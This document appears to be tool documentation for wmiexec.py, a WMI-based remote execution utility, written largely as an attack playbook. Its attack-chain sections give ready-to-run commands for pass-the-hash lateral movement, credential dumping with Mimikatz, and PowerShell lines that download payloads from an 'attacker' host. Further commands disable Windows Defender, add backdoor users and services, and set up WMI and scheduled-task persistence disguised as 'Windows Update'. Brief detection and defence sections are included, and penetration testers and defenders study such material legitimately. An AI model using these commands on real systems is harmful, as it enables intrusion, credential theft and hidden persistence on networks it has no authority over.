# wmiexec.py

## Overview
`wmiexec.py` provides remote command execution capabilities using Windows Management Instrumentation (WMI). It's an alternative to psexec that uses WMI instead of SMB services, making it useful when SMB-based execution is blocked or monitored.

## Detailed Description
This tool leverages WMI (Windows Management Instrumentation) to execute commands remotely on Windows systems. WMI execution is often less monitored than SMB-based methods and can bypass some security controls that specifically target psexec-style attacks.

### Key Features:
- **WMI-based Execution**: Uses WMI for remote command execution
- **Semi-interactive Shell**: Provides command shell functionality
- **Multiple Authentication**: Supports password, hash, and Kerberos authentication
- **Stealth Execution**: Often generates less suspicious logs than SMB methods
- **No File Upload**: Doesn't require uploading executables to target

### Technical Details:
- Uses DCOM (Distributed COM) over RPC
- Leverages Win32_Process WMI class for execution
- Creates processes via WMI CreateProcess method
- Uses named pipes for I/O redirection

## Command Line Options

```
usage: wmiexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-debug] [-codec CODEC]
                  [-shell-type {cmd,powershell}] [-silentcommand] [-hashes LMHASH:NTHASH]
                  [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip] [-A authfile]
                  [-keytab KEYTAB] target [command ...]

Required Arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  command               Command to execute (if not specified, semi-interactive shell)

Optional Arguments:
  -share                Share to write output to (default: ADMIN$)
  -nooutput             Don't retrieve command output
  -ts                   Add timestamp to every logging output
  -debug                Turn DEBUG output ON
  -codec                Codec to use for output (default: utf-8)
  -shell-type           Shell type to use (cmd or powershell)
  -silentcommand        Execute command without retrieving output

Authentication:
  -hashes               NTLM hashes (LM:NT)
  -no-pass              Don't ask for password
  -k                    Use Kerberos authentication
  -aesKey               AES key for Kerberos authentication
  -dc-ip                Domain controller IP address
  -A                    Authentication file
  -keytab               Kerberos keytab file
```

## Usage Examples

### Basic Remote Shell
```bash
# Interactive shell with password authentication
python3 wmiexec.py domain.com/administrator:password@target.domain.com

# Interactive shell with hash authentication
python3 wmiexec.py -hashes :ntlmhash administrator@target.domain.com

# Interactive shell with Kerberos
python3 wmiexec.py -k domain.com/administrator@target.domain.com -dc-ip 192.168.1.10
```

### Single Command Execution
```bash
# Execute single command
python3 wmiexec.py domain.com/administrator:password@target.domain.com "whoami"

# Get system information
python3 wmiexec.py domain.com/administrator:password@target.domain.com "systeminfo"

# List running processes
python3 wmiexec.py domain.com/administrator:password@target.domain.com "tasklist"
```

### PowerShell Execution
```bash
# Use PowerShell instead of cmd
python3 wmiexec.py domain.com/administrator:password@target.domain.com -shell-type powershell

# Execute PowerShell command directly
python3 wmiexec.py domain.com/administrator:password@target.domain.com "powershell.exe -Command Get-Process"
```

### Advanced Options
```bash
# Execute without retrieving output (silent)
python3 wmiexec.py domain.com/administrator:password@target.domain.com -nooutput "net user backdoor P@ss123 /add"

# Use custom share for output
python3 wmiexec.py domain.com/administrator:password@target.domain.com -share C$ "dir"

# Silent command execution
python3 wmiexec.py domain.com/administrator:password@target.domain.com -silentcommand "sc create backdoor binPath= cmd.exe"
```

## Attack Chain Integration

### Initial Lateral Movement
```bash
# Step 1: Obtain credentials through various methods
python3 secretsdump.py domain.com/user:password@dc.domain.com

# Step 2: Use extracted admin hash for WMI execution
python3 wmiexec.py -hashes :admin_hash administrator@target1.domain.com

# Step 3: Gather information from new target
# In wmiexec shell:
# whoami /priv
# net user /domain
# wmic computersystem get domain
```

### Stealth Operations
```bash
# Step 1: Use WMI for less detectable execution
python3 wmiexec.py domain.com/administrator:password@target.domain.com -shell-type powershell

# Step 2: Execute memory-only payloads
# In PowerShell shell:
# IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
# Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

### Post-Exploitation Chain
```bash
# Step 1: Access system via WMI
python3 wmiexec.py domain.com/administrator:password@target.domain.com

# Step 2: Disable security tools (in wmiexec shell)
# sc stop windefend
# sc config windefend start= disabled
# reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1

# Step 3: Establish persistence
# sc create backdoor binPath= "cmd.exe /c powershell.exe -Command ..."
# schtasks /create /tn "Windows Update" /tr "powershell.exe -Command ..." /sc onstart
```

### Credential Harvesting Chain
```bash
# Step 1: Access multiple systems with WMI
for target in $(cat targets.txt); do
    python3 wmiexec.py -hashes :hash administrator@$target "hostname && whoami"
done

# Step 2: Deploy credential harvesting tools
python3 wmiexec.py -hashes :hash administrator@target.domain.com -shell-type powershell
# In PowerShell:
# (New-Object Net.WebClient).DownloadFile('http://attacker/mimikatz.exe', 'C:\temp\m.exe')
# C:\temp\m.exe "sekurlsa::logonpasswords" exit

# Step 3: Collect results and move laterally
python3 wmiexec.py -hashes :hash administrator@target.domain.com "type C:\temp\output.txt"
```

## Interactive Shell Commands

### System Information
```cmd
# Basic system information
whoami
whoami /priv
whoami /groups
hostname
systeminfo

# Network configuration
ipconfig /all
netstat -an
arp -a
route print
```

### Domain Information
```cmd
# Domain enumeration
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
wmic computersystem get domain
```

### Process and Service Management
```cmd
# Process information
tasklist
tasklist /svc
wmic process list brief

# Service management
sc query
sc query state= all
net start
wmic service list brief
```

### PowerShell Commands
```powershell
# When using -shell-type powershell
Get-Process
Get-Service
Get-WmiObject -Class Win32_ComputerSystem
Get-WmiObject -Class Win32_OperatingSystem
Get-LocalUser
Get-LocalGroup
```

## Prerequisites
- Administrative credentials on target system
- Network access to target (RPC ports)
- WMI service running on target (enabled by default)
- DCOM/RPC connectivity (port 135 + dynamic ports)
- Windows target system

## Detection Considerations
- **Event ID 4688**: Process creation events showing unusual command execution
- **WMI Event Logs**: WMI-Activity/Operational logs showing unusual activity
- **Event ID 4624**: Network logon events
- **Process Indicators**: Unusual child processes of WmiPrvSE.exe
- **Network Indicators**: RPC traffic to unusual hosts
- **WMI Queries**: Unusual WMI class access patterns

## Defensive Measures
- **WMI Logging**: Enable detailed WMI logging and monitoring
- **Process Monitoring**: Monitor for unusual WmiPrvSE.exe child processes
- **Network Segmentation**: Limit RPC/DCOM access between systems
- **Privileged Access Management**: Control administrative account usage
- **WMI Hardening**: Implement WMI namespace security and access controls
- **Endpoint Detection**: Deploy EDR solutions to detect WMI abuse

## Advantages over PSExec
- **Less Detection**: Often generates fewer security alerts
- **No File Upload**: Doesn't require uploading executables
- **Built-in Functionality**: Uses native Windows WMI capabilities
- **Network Firewall**: May bypass firewalls blocking SMB
- **Process Parent**: Processes appear under WmiPrvSE.exe

## Common Issues and Troubleshooting

### DCOM Configuration Errors
```bash
# Test WMI connectivity
wmic /node:target.domain.com /user:domain\user /password:password computersystem get name

# Check DCOM permissions
dcomcnfg.exe (on target system)
```

### Firewall Issues
```bash
# Test RPC connectivity
nc -zv target.domain.com 135

# Check for dynamic port ranges
netstat -an | grep LISTEN (on target)
```

### Authentication Problems
```bash
# Verify credentials work with other tools
python3 smbclient.py domain.com/user:password@target.domain.com

# Test with different authentication methods
python3 wmiexec.py -hashes :hash user@target.domain.com
python3 wmiexec.py -k domain.com/user@target.domain.com
```

## Advanced WMI Techniques

### WMI Persistence
```cmd
# Create WMI event subscription for persistence
wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="WindowsUpdate", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"

# Create consumer
wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="WindowsUpdate", CommandLineTemplate="powershell.exe -Command ..."

# Bind filter to consumer
wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"WindowsUpdate\"", Consumer="CommandLineEventConsumer.Name=\"WindowsUpdate\""
```

### WMI Information Gathering
```cmd
# Enumerate WMI classes
wmic class list brief
wmic class Win32_Service list brief
wmic class Win32_Process list brief

# Query specific information
wmic computersystem get model,manufacturer
wmic bios get serialnumber
wmic logicaldisk get size,freespace,caption
```

## Related Tools
- [psexec.py](psexec.md) - SMB-based remote execution
- [smbexec.py](smbexec.md) - Alternative SMB execution method
- [dcomexec.py](dcomexec.md) - DCOM-based execution
- [secretsdump.py](secretsdump.md) - Credential extraction
- [atexec.py](atexec.md) - Scheduled task execution
- [wmiquery.py](wmiquery.md) - WMI query execution
